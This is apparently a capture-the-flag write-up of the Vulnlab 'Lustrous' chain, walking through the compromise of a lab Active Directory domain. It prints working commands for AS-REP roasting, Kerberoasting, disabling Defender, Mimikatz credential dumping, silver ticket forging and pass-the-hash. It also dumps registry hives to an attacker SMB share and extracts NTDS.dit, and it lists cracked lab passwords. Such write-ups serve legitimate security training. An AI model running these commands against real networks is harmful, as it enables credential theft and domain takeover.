
| Chain Name | Difficulty | Date Started | Date Completed |
| ---------- | ---------- | ------------ | -------------- |
| Lustrous   | Medium     | 03/01/2024   | 07/01/2024     |
*Vulnlab.com* 

---

**Learning Points:**

- Maintain a `users.txt` file and add usernames to it when pentesting on the go.
- Service accounts can issue silver tickets (A **Silver Ticket** can only be forged for **specific services** that rely on **Kerberos authentication** and have an **associated Service Principal Name (SPN)** in Active Directory).
- Leverage the [BackupOperatorToDA](https://github.com/mpgn/BackupOperatorToDA) tool: If you compromise an account that is a member of the Backup Operators group, you can become a Domain Admin without RDP or WinRM on the Domain Controller.
- The DSRM hash can't be used unless DSRM is enabled. Instead, the **machine account** (e.g., `LusDC$`), a **built-in account** with **SYSTEM-level privileges**, can dump the **NTDS.dit** file. Using its **NTLM hash**, tools like **Mimikatz** or **Impacket's secretsdump.py** can remotely dump **NTDS.dit**, bypassing standard authentication.

---

**Attack Path :**

1. Started an Nmap scan on both hosts to identify open ports.  
2. Logged into the FTP service as anonymous on Host A using `lftp` and found a `users.csv` file.  
3. Downloaded the `users.csv` file using the `mirror -c -e -n .` command.  
4. Performed an AS-REP roasting attack and obtained the hash of `ben.cox`.  
5. Cracked the hash and logged in to `LusMS.lustrous.vl` using `ben.cox` credentials.  
6. Found an `admin.xml` file on the desktop containing an encrypted PS credential hash for the local administrator.  
7. Decrypted the hash, confirmed it worked using `crackmapexec`, and logged in as administrator using Evil-WinRM.  
8. Retrieved the `Lustrous_User` flag.  
9. Disabled Defender, uploaded Mimikatz, and extracted hashes.  
10. Logged into the HTTP service of the DC using `ben.cox` with Kerberos authentication and accessed two notes in the web application.  
11. Enumerated BloodHound and found that `svc_web` was Kerberoastable.  
12. Cracked the hash of `svc_web` using Hashcat.  
13. Used `svc_web` credentials to create a silver ticket and impersonate `tony.ward`, a member of the Backup Operators group.  
14. Used `impacket-ticket` to forge the silver ticket and access the HTTP service.  
15. Extracted the SAM database from **lusdc** using the [BackupOperatorToDA](https://github.com/mpgn/BackupOperatorToDA) tool.  
16. Saved the files to the SMB share and used `secretsdump` to dump hashes from the **LusDC** host.  
17. Retrieved the machine hash and used it to dump the `ntds.dit` file from the Domain Controller.  
18. Logged into the Domain Controller (DC) using Evil-WinRM and a pass-the-hash attack to retrieve the **lustrous_Root** flag.

---


Activity Log :
- Started an nmap scan to both hosts to identify open ports
- Enumerated port 80 on Host A while nmap scan is running and found a deafult IIS page
- Ran an FFUF scan to find hidden directories but didn't find anything interesting.
- Logged into the FTP service as anonymous on Host A using lftp and was able to see a `users.csv` file.
- We used the `mirror -c -e -n .` command to save everything to Falcon.
- Saved the users to a file and ran a Kerbrute user enumeration scan, but found that only the `Administrator` user was valid.
- Enumerated the SMB shares of both machines using null sessions but didn't find anything.
- Tried to enumerate usernames through SID brute-forcing but also failed.
- Connecting to LDAPS on the DC also failed.
- Using the usernames we had, we tried to perform AS-REP roasting but were unable to get anything working.
- We added the four users we found from the SMB share to the `ftp_users.txt` file.
- We performed the AS-REP roasting attack again and were able to obtain the hash of the user `ben.cox`.
- Using the credentials we had, we started mapping the AD network for further attacks. As the first step, we used BloodHound-Python to enumerate and graph the network.
- Had to use BloodHound-Python with the sudo command, as we couldn't get it to work otherwise.
- We were able to see a user named `tony.ward` who is a member of the `Backup Admin` group; however, we couldn't find anything reachable from that group.
- Enumerating the BloodHound graph, it was noted that the `svc_web` and `svc_db` users are Kerberoastable.
- We were able to crack the hash of the user `svc_web` using Hashcat.
- We were not able to log in to either host using the `svc_web` user's credentials.
- We used the credentials of the user `ben.cox` and were able to log in to the `LusMS.lustrous.vl` host. While enumerating, we noted an `admin.xml` file on the user's desktop that contained the encrypted PS credential hash of the local administrator.
- We decrypted the password and confirmed that it works using crackmapexec.
- We logged into the machine using Evil-WinRM as the administrator and obtained the `Lustrous_User` flag.
- Uploaded Mimikatz, but it was detected by the antivirus.
- Since we had administrator access to the machine, we disabled Defender.
- We uploaded Mimikatz again and extracted the hashes from LSASS, but were not able to find anything interesting.
- We used XFreeRDP to log in to the machine and accessed the port 80 page of the DC, but we encountered a prompt requiring authorization to access the page.
- This meant that the web application used Kerberos authentication. We logged in as `ben.cox` and were able to see two notes in the web application.
- We used the `svc_web` password to create a silver ticket and impersonate `tony.ward`, a member of the Backup Operators group, by obtaining his SID through `rpcclient`.
- Using `impacket-ticket`, we forged a silver ticket.
- We successfully forged the ticket; however, we couldn't access the URL even though the ticket was exported from Falcon.
- We tried to execute the attack from the Windows host but failed because our command was incorrect.
- We used the correct command and were able to generate a silver ticket to access the HTTP service as the user `tony.ward`.
- We could not use the credentials to log in using Evil-WinRM or RDP to any hosts.
- Since we obtained the `tony.ward` password, we were able to use it to extract the SAM database from the **lusdc** host. We leveraged the [BackupOperatorToDA](https://github.com/mpgn/BackupOperatorToDA) tool to do so. 
- Then, we uploaded the tool to the RDP session and executed it with the necessary parameters.
- After saving the needed files to our smb share, we used `secretsdump` to dump the hashes of the **LusDC** host and were successful.
- However, we tried using the hash of the machine account we obtained from the secrets dump, but failed to perform the attack.
- We removed all the current SAM, SYSTEM, and other hives we had from Eagle and performed the attack again to download the hives. We executed the secrets dump again, obtained the machine hash, and performed the secrets dump once more against the Domain Controller (DC) using the machine hash of the DC. As a result, we were able to dump the `ntds.dit` file.  
- Using the hash of the domain administrator, we were able to log in to the Domain Controller (DC) and retrieve the **lustrous_Root** flag using the Evil-WinRM pass-the-hash attack.

---

| Host   | Host Name         | IP Address        | Status  |
| ------ | ----------------- | ----------------- | ------- |
| Host A | LusDC.lustrous.vl | 10.10.135.37      | Changed |
| Host B | LusMS.lustrous.vl | 10.10.135.38 (+1) | Changed |

*Default nmap scan HostA*
```
# Nmap 7.94SVN scan initiated Fri Jan  3 00:17:16 2025 as: nmap -sC -sV -oA hostA_default -Pn 10.10.231.229
Nmap scan report for 10.10.231.229
Host is up (0.17s latency).
Not shown: 985 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_12-26-21  11:50AM       <DIR>          transfer
53/tcp   open  domain?
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-02 18:47:47Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: lustrous.vl0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=LusDC.lustrous.vl
| Subject Alternative Name: DNS:LusDC.lustrous.vl
| Not valid before: 2021-12-26T09:46:02
|_Not valid after:  2022-12-26T00:00:00
|_http-title: Not Found
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Microsoft-HTTPAPI/2.0
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: lustrous.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-01-02T18:50:50+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: LUSTROUS
|   NetBIOS_Domain_Name: LUSTROUS
|   NetBIOS_Computer_Name: LUSDC
|   DNS_Domain_Name: lustrous.vl
|   DNS_Computer_Name: LusDC.lustrous.vl
|   DNS_Tree_Name: lustrous.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-01-02T18:50:10+00:00
| ssl-cert: Subject: commonName=LusDC.lustrous.vl
| Not valid before: 2025-01-01T18:44:11
|_Not valid after:  2025-07-03T18:44:11
Service Info: Host: LUSDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-01-02T18:50:13
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan  3 00:20:57 2025 -- 1 IP address (1 host up) scanned in 220.94 seconds
```

*Default nmap scan HostB*
```
# Nmap 7.94SVN scan initiated Fri Jan  3 00:22:04 2025 as: nmap -sC -sV -Pn -oA hostB_default 10.10.231.230
Nmap scan report for 10.10.231.230
Host is up (0.18s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-01-02T18:53:12+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: LUSTROUS
|   NetBIOS_Domain_Name: LUSTROUS
|   NetBIOS_Computer_Name: LUSMS
|   DNS_Domain_Name: lustrous.vl
|   DNS_Computer_Name: LusMS.lustrous.vl
|   DNS_Tree_Name: lustrous.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-01-02T18:52:32+00:00
| ssl-cert: Subject: commonName=LusMS.lustrous.vl
| Not valid before: 2025-01-01T18:44:10
|_Not valid after:  2025-07-03T18:44:10
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-01-02T18:52:33
|_  start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan  3 00:23:13 2025 -- 1 IP address (1 host up) scanned in 69.39 seconds

```

Enumerated port 80 on Host A while nmap scan is running and found a deafult IIS page :

<img src="attachments/3ba05dc82f28d116d6a338907a92d08b.png" />

Ran an FFUF scan to find hidden directories but didn't find anything interesting.

Logged into the FTP service as anonymous on Host A using lftp and was able to see a `users.csv` file.

```
┌──(destiny㉿falcon)-[~/Vulnlab/Chains/Lustrous]
└─$ lftp ftp://anonymous:anonymous@LusDC.lustrous.vl
lftp anonymous@LusDC.lustrous.vl:~> find
./                      
./transfer/                                                  
./transfer/ben.cox/                                                       ./transfer/ben.cox/users.csv                                             ./transfer/rachel.parker/
./transfer/tony.ward/                                                   ./transfer/wayne.taylor/ 
```

We used the `mirror -c -e -n .` command to save everything to Falcon.

*Users.csv :*
<img src="attachments/d31c1120d26a3e938c2280f1443884eb.png" />

Saved the users to a file and ran a Kerbrute user enumeration scan, but found that only the `Administrator` user was valid.

<img src="attachments/5fcba14090ada3633763dbfc79172273.png" />

Enumereated the smb shares of both machines as null sessions but couldn't find anything :

*Host A :*
<img src="attachments/c7d75b4b798639484db03c8f41f43614.png" />

*Host B :*
<img src="attachments/473e231d6d65ee5ce2e05e65621aa0af.png" />

Tried to enumerate usernames through SID brute-forcing but also failed.

<img src="attachments/b72f3ccd92d9f268b594fde1dcf41d86.png" />

Connecting to LDAPS on the DC also failed.

<img src="attachments/13b950e935820479bb6c6db53fa52078.png" />
Using the usernames we had, we tried to perform AS-REP roasting but were unable to get anything working.

<img src="attachments/c009fa29ffecd6212bb0f105420997a5.png" />

We added the four users we found from the SMB share to the `ftp_users.txt` file.

```
ben.cox                                                                rachel.parker
tony.ward                            
wayne.taylor
```

We performed the AS-REP roasting attack again and were able to obtain the hash of the user `ben.cox`.

<img src="attachments/15ad722fb4d6d3b2095399bc657afa66.png" />

```
ben.cox@LUSTROUS.VL:Trinity1
```

<img src="attachments/068dff4899e051b6a23153f77c95b942.png" />

Used CrackMapExec and was able to confirm the credentials against the DC (Host A).

<img src="attachments/a340ccb70b944e76d54f5c14a0d9aef3.png" />

Enumerated the SMB shares for the user using CrackMapExec.

<img src="attachments/758853bd695a2ea37394e36ffa2c1489.png" />

Using the credentials we had, we started mapping the AD network for further attacks. As the first step, we used BloodHound-Python to enumerate and graph the network.

*Had to use BloodHound-Python with the sudo command, as we couldn't get it to work otherwise.*

```
sudo bloodhound-python -d 'LUSTROUS.VL' -u 'ben.cox' -p 'Trinity1' -ns 10.10.231.229 -dc LusDC.lustrous.vl -c all
```

<img src="attachments/f00e5151b67ae045315ceeb9d4506349.png" />


### Bloodhound enumeration

We were able to see a user named `tony.ward` who is a member of the `Backup Admin` group; however, we couldn't find anything reachable from that group.

<img src="attachments/78710806828ecb7c976b23cd8b155f9a.png" />

##### Kerberoasting

Enumerating the BloodHound graph, it was noted that the `svc_web` and `svc_db` users are Kerberoastable.

<img src="attachments/d8ca9f52ddb366e33b79bf059842b2e3.png" />

```
impacket-GetUserSPNs -dc-ip 10.10.135.37 LUSTROUS.VL/ben.cox -request -outputfile kerb.txt
```

<img src="attachments/f677381232239d2fe19bb85a35a8d9e0.png" />

We were able to crack the hash of the user `svc_web` using Hashcat.

```
svc_web:iydgTvmujl6f
```

<img src="attachments/3ee58049afccdaccb149b5721dd3a0d1.png" />

We were not able to log in to either host using the `svc_web` user's credentials.

<img src="attachments/41ddec080b4cbc4631bdca1a3a341661.png" />

We used the credentials of the user `ben.cox` and were able to log in to the `LusMS.lustrous.vl` host. While enumerating, we noted an `admin.xml` file on the user's desktop that contained the encrypted PS credential hash of the local administrator.

<img src="attachments/a5825c20d35f1ac521fa6f791a94c6fc.png" />


We used the following command to decrypt the password:

```
$cred = Import-Clixml -Path .\admin.xml
$cred.GetNetworkCredential().Password
```

*LusMS.lustrous.vl :*
```
Local Administrator : XZ9i=bgA8KhRP.f=jr**Qgd3Qh@n9dRF
```

We also confirmed that it works using CrackMapExec.

<img src="attachments/7674b55ca077df07009866355780293d.png" />

We logged into the machine using Evil-WinRM as the administrator and obtained the `Lustrous_User` flag.

<img src="attachments/ec974c5c8516bde39b45c59576e8584a.png" />

Uploaded Mimikatz, but it was detected by the antivirus.

<img src="attachments/792b6e1346a03040cada3f7f3aae0863.png" />

Since we had administrator access to the machine, we used the following command to disable Defender:

```
Set-MpPreference -DisableRealtimeMonitoring $true
```

We uploaded Mimikatz again and extracted the hashes from LSASS, but were not able to find anything interesting.

```
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

<img src="attachments/02b80a789a44e8783cecd86c8bdcbff4.png" />

We used XFreeRDP to log in to the machine and accessed the port 80 page of the DC, but we encountered a prompt requiring authorization to access the page.

<img src="attachments/b36a79b9d7c4479f16dd5cb93ec4bab2.png" />

This meant that the web application used Kerberos authentication. We logged in as `ben.cox` and were able to see two notes in the web application.

<img src="attachments/8204a6b56868c855cd2cf91e2aba036c.png" />

---

##### Silver Ticket Attack

We have the password for `svc_web`, which means we can create a silver ticket to impersonate any user on the application. Since we saw that `tony.ward` is part of the Backup Operators group, we may need to move forward with that user. To impersonate as `tony`, we can use `rpcclient` to get the SID of `tony`.

```
┌──(destiny㉿falcon)-[~/Vulnlab/Chains/Lustrous]
└─$ rpcclient -U 'ben.cox' LusDC.lustrous.vl
Password for [WORKGROUP\ben.cox]:
rpcclient $> lookupnames tony.ward
tony.ward S-1-5-21-2355092754-1584501958-1513963426-1114 (User: 1)
```

_We obtained the SPN of the user `svc_web` using the Kerberoasting attack._

<img src="attachments/ed43dbb84761d03a2c0dfd091e3a6d75.png" />

Using `impacket-ticket`, we forged a silver ticket.

```
impacket-ticketer -nthash '69596C7AA1E8DAEE17F8E78870E25A5C' -domain-sid 'S-1-5-21-2355092754-1584501958-1513963426' -domain lustrous.vl -spn 'http/lusdc.lustrous.vl' -dc-ip 10.10.155.53 -user-id 1114 'tony.ward'
```

<img src="attachments/15e8a66a718bd299f961a23d9dbae3e7.png" />

We successfully forged the ticket; however, we couldn't access the URL even though the ticket was exported from Falcon.

<img src="attachments/f4bd7b9214db8c6a1e1561351b76e548.png" />

---

We tried to execute the attack from the Windows host but failed because our command was incorrect.

```
kerberos::golden /domain:lustrous.vl /sid:S-1-5-21-2355092754-1584501958-1513963426 /rc4:<SERVICE_ACCOUNT_HASH> /user:tony.ward /target:LusApp.lustrous.vl /service:http /ptt
```

<img src="attachments/798d3be87f470ac0cdc9d05e5788a758.png" />

```
kerberos::golden /domain:lustrous.vl /sid:S-1-5-21-2355092754-1584501958-1513963426 /rc4:e67af8b3d78df5a02eb0d57b6cb60717 /user:tony.ward /target:LusApp.lustrous.vl /service:http /ptt
```


<img src="attachments/40d1e0ad6efdd1aace0f24e7f4d2678f.png" />

Running `klist`, we'll see that the ticket is loaded into memory.

<img src="attachments/11839818f3ca021a76d8a2685772b5e2.png" />

We tried to access the `Internal` endpoint with `Invoke-WebRequest` but failed.

<img src="attachments/3e767bad517a064b0f3166d2e5e72e36.png" />

We used the `klist purge` command to remove all tickets from memory.

---

We used the following command and were able to generate a silver ticket to access the HTTP service as the user `tony.ward`.

```
kerberos::golden /domain:lustrous.vl /sid:S-1-5-21-2355092754-1584501958-1513963426 /target:lusdc.lustrous.vl /service:HTTP /rc4:e67af8b3d78df5a02eb0d57b6cb60717 /user:tony.ward /id:1114 /target:lusdc.lustrous.vl /ptt
```

<img src="attachments/69cb8fd6dea8d8e99b305793fcd59837.png" />

We used PowerShell to access the page again and found the credentials of the user `tony.ward`.

```
Invoke-WebRequest -Uri http://lusdc.lustrous.vl/Internal -UseDefaultCredentials -UseBasicParsing | Select-Object -Expand Content
```

<img src="attachments/f31c7a27dcb3f2f86a69a4fd9c6f3e41.png" />

```
tony.ward : U_cPVQqEI50i1X
```

#### Abusing the Backup Admins Privileges

We could not use the credentials to log in using Evil-WinRM or RDP to any hosts.

<img src="attachments/e750eaecf5655f64b0a9ceb32f3b3fdb.png" />

Since we obtained the `tony.ward` password, we were able to use it to extract the SAM database from the **lusdc** host. We leveraged the [BackupOperatorToDA](https://github.com/mpgn/BackupOperatorToDA) tool to do so. The tool attempted to dump the SAM file from the **lusdc** host and export it to the remote share. We had to create an SMB share using the `smbserver` script from Impacket first.

>_BackupOperatorToDA : If you compromise an account member of the group Backup Operators you can become the Domain Admin without RDP or WinRM on the Domain Controller._

```
impacket-smbserver -smb2support smb $(pwd)
```

Then, we uploaded the tool to the RDP session and executed it with the necessary parameters.

```
.\BackupOperatorToDA.exe -t \\lusdc.lustrous.vl -u tony.ward -p U_cPVQqEI50i1X -d lustrous.vl -o \\10.8.4.157\smb\
```

<img src="attachments/163ceae0457edf49a7a39109f6e6bbbd.png" />

After saving the needed files to our smb share, we used `secretsdump` to dump the hashes of the **LusDC** host and were successful.

```
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY local
```

<img src="attachments/c9a9d0578afb15d7f2809f6e93d88d41.png" />

The DSRM hash can't be used unless DSRM is enabled. Instead, the **machine account (LusDC$)**, a **built-in account** with **SYSTEM-level privileges**, can dump the **NTDS.dit** file. Using its **NTLM hash**, tools like **Mimikatz** or **Impacket's secretsdump.py** can remotely dump **NTDS.dit**, bypassing standard authentication.

However, we tried using the hash of the machine account we obtained from the secrets dump, but failed to perform the attack.

<img src="attachments/f30aca42230c6956a51a3514bf504a44.png" />

----

We removed all the current SAM, SYSTEM, and other hives we had from Eagle and performed the attack again to download the hives. We executed the secrets dump again, obtained the machine hash, and performed the secrets dump once more against the Domain Controller (DC) using the machine hash of the DC. As a result, we were able to dump the `ntds.dit` file.  

<img src="attachments/9c1f956a45871701879578d39a0e275e.png" />

Using the hash of the domain administrator, we were able to log in to the Domain Controller (DC) and retrieve the **lustrous_Root** flag using the Evil-WinRM pass-the-hash attack.

<img src="attachments/104c7f9e5c46cbf81276235bfa6523d0.png" />

---